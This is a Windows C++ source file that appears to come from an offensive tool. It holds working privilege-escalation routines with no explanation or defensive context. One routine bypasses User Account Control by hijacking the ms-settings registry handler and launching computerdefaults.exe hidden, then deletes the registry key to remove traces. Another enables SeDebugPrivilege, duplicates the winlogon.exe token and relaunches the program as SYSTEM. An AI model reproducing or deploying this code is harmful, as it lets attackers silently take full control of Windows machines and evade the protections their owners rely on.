#include"pch.h"

DWORD FindProcessPID(const wchar_t* ProcessName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp((const wchar_t*)process.szExeFile, (const wchar_t*)ProcessName))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

BOOL SePrivTokenrivilege(
    HANDLE hToken,
    LPCTSTR lpszPrivilege,
    BOOL bEnablePrivilege
)
{
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,
        lpszPrivilege,
        &luid))
    {
        return FALSE;
    }

    TOKEN_PRIVILEGES PrivToken;
    PrivToken.PrivilegeCount = 1;
    PrivToken.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        PrivToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        PrivToken.Privileges[0].Attributes = 0;


    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &PrivToken,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        return FALSE;
    }

    return TRUE;
}


BOOL BypassUacRestart(void) {
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    HKEY hKey;

    char szPath[MAX_PATH + 1] = { 0 };
    GetModuleFileNameA(NULL, szPath, MAX_PATH);

    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
    RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\computerdefaults.exe.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    Sleep(1000);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    return TRUE;
}

BOOL TokenManipulationRestart() {
    HANDLE hToken = NULL;
    HANDLE hDpToken = NULL;
    HANDLE hCurrentToken = NULL;
    BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken);
    SePrivTokenrivilege(hCurrentToken, L"SeDebugPrivilege", TRUE);

    DWORD PID_TO_IMPERSONATE = FindProcessPID(L"winlogon.exe");
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);



    BOOL TokenRet = OpenProcessToken(hProcess,
        TOKEN_DUPLICATE |
        TOKEN_ASSIGN_PRIMARY |
        TOKEN_QUERY, &hToken);

    BOOL impersonateUser = ImpersonateLoggedOnUser(hToken);
    if (GetLastError() == NULL)
    {
        RevertToSelf();
    }


    BOOL dpToken = DuplicateTokenEx(hToken,
        TOKEN_ADJUST_DEFAULT |
        TOKEN_ADJUST_SESSIONID |
        TOKEN_QUERY |
        TOKEN_DUPLICATE |
        TOKEN_ASSIGN_PRIMARY,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &hDpToken
    );

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOEXW);
    wchar_t szPath[MAX_PATH + 1] = { 0 };
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    BOOL Ret =
        CreateProcessWithTokenW(hDpToken,
            LOGON_WITH_PROFILE,
            szPath,
            NULL,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
